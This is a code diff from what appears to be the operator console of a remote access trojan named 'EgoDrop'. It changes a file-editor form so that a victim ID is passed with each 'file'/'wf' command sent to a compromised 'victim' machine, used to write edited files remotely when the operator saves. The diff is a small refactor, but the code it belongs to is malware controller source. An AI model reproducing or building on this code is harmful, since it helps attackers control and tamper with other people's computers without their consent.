@@ -16,6 +16,7 @@ namespace EgoDrop
 {
     public partial class frmFileEditor : Form
     {
+        public string m_szVictimID { get; init; }
         public clsVictim m_victim { get; set; }
         private Dictionary<string, Action> m_dicActEvent = new Dictionary<string, Action>();
 
@@ -37,10 +38,11 @@ namespace EgoDrop
             }
         }
 
-        public frmFileEditor(clsVictim victim)
+        public frmFileEditor(string szVictimID, clsVictim victim)
         {
             InitializeComponent();
 
+            m_szVictimID = szVictimID;
             m_victim = victim;
         }
 
@@ -197,7 +199,7 @@ namespace EgoDrop
 
                     if (page.Text.Contains("*"))
                     {
-                        m_victim.fnSendCommand(new string[]
+                        m_victim.fnSendCommand(m_szVictimID, new string[]
                         {
                             "file",
                             "wf",
@@ -297,7 +299,7 @@ namespace EgoDrop
                                 tabControl1.TabPages.Remove(page);
                             });
 
-                            m_victim.fnSendCommand(new string[]
+                            m_victim.fnSendCommand(m_szVictimID, new string[]
                             {
                                 "file",
                                 "wf",
@@ -313,7 +315,7 @@ namespace EgoDrop
                 }
                 else if (e.KeyCode == Keys.S) //Save file.
                 {
-                    m_victim.fnSendCommand(new string[]
+                    m_victim.fnSendCommand(m_szVictimID, new string[]
                     {
                         "file",
                         "wf",
